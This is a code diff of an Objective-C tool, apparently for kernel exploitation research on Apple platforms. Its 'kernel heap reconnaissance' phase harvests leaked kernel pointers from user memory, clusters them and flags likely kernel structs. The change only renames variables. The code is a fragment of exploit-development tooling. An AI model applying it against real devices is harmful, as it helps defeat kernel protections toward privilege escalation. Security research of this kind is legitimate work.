@@ -592,8 +592,8 @@ static BOOL isKernelPointer(uint64_t v) {
     [report appendString:@"\n--- Phase 10: kernel heap reconnaissance ---\n"];
 
     scanAddr = 0; scanSize = 0;
-    uint64_t kptrs[512] = {0};
-    size_t kptrAddrs[512] = {0};
+    uint64_t kptrs10[512] = {0};
+    size_t kptrAddrs10[512] = {0};
     int nkptrs = 0;
 
     while (1) {
@@ -613,8 +613,8 @@ static BOOL isKernelPointer(uint64_t v) {
             uint64_t v = rp[i];
             if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
             if ((v & 0xfff) == 0xfff) continue;
-            kptrs[nkptrs] = v;
-            kptrAddrs[nkptrs] = i * 8;
+            kptrs10[nkptrs] = v;
+            kptrAddrs10[nkptrs] = i * 8;
             nkptrs++;
         }
     }
@@ -628,7 +628,7 @@ static BOOL isKernelPointer(uint64_t v) {
     int nclusters = 0;
 
     for (int i = 0; i < nkptrs; i++) {
-        uint64_t bucket = kptrs[i] & ~0x3ffffULL; // 256KB alignment
+        uint64_t bucket = kptrs10[i] & ~0x3ffffULL; // 256KB alignment
         BOOL found = NO;
         for (int c = 0; c < nclusters; c++) {
             if (clusterBase[c] == bucket) {
@@ -665,8 +665,8 @@ static BOOL isKernelPointer(uint64_t v) {
         [report appendFormat:@"\ncluster 0x%llx pointers:\n", clusterBase[c]];
         int shown = 0;
         for (int i = 0; i < nkptrs && shown < 8; i++) {
-            if ((kptrs[i] & ~0x3ffffULL) == clusterBase[c]) {
-                [report appendFormat:@"  [user+0x%zx] -> kernel 0x%llx\n", kptrAddrs[i], kptrs[i]);
+            if ((kptrs10[i] & ~0x3ffffULL) == clusterBase[c]) {
+                [report appendFormat:@"  [user+0x%zx] -> kernel 0x%llx\n", kptrAddrs10[i], kptrs10[i]);
                 shown++;
             }
         }
@@ -678,12 +678,12 @@ static BOOL isKernelPointer(uint64_t v) {
     int procCandidates = 0;
     for (int i = 0; i < nkptrs && procCandidates < 5; i++) {
         for (int j = i + 1; j < nkptrs; j++) {
-            uint64_t diff = (kptrs[i] > kptrs[j]) ? kptrs[i] - kptrs[j] : kptrs[j] - kptrs[i];
+            uint64_t diff = (kptrs10[i] > kptrs10[j]) ? kptrs10[i] - kptrs10[j] : kptrs10[j] - kptrs10[i];
             if (diff > 0 && diff < 0x400) {
                 // Two kernel pointers within 0x400 bytes — possible struct fields
-                uint64_t lo = (kptrs[i] < kptrs[j]) ? kptrs[i] : kptrs[j];
+                uint64_t lo = (kptrs10[i] < kptrs10[j]) ? kptrs10[i] : kptrs10[j];
                 [report appendFormat:@"pair: 0x%llx and 0x%llx (gap=0x%llx) -> possible struct at 0x%llx\n",
-                 kptrs[i], kptrs[j], diff, lo];
+                 kptrs10[i], kptrs10[j], diff, lo];
                 procCandidates++;
                 if (procCandidates >= 5) break;
             }
